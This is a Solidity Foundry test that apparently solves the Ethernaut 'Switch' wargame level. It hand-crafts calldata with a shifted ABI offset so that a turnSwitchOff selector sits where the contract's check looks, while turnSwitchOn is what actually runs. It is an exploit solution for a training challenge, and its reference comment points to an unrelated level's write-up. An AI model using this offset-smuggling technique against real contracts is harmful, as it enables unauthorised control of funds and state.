// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "../src/Switch/Switch.sol";
import "../src/Switch/SwitchFactory.sol";
import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

//ref https://medium.com/coinmonks/28-gatekeeper-three-ethernaut-explained-596115f165a

contract SwitchTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testSwitch() public {
        SwitchFactory factory = new SwitchFactory();
        address instance = factory.createInstance(_alice);
        instance.call(
            bytes.concat(
                Switch.flipSwitch.selector, // run flipswitch  4bytes
                bytes32(uint256(0x60)), //offset, start bytes of the data is 96 + 4 = 100bytes ~36byte
                bytes32(0), //  ~68bytes
                bytes32(Switch.turnSwitchOff.selector), // pass onlyOff ~100bytes
                bytes32(uint256(0x04)), // length of data(turnSwitchOn.selector) = 4bytes
                Switch.turnSwitchOn.selector
            )
        );

        assertTrue(factory.validateInstance(payable(instance), _alice));
    }
}
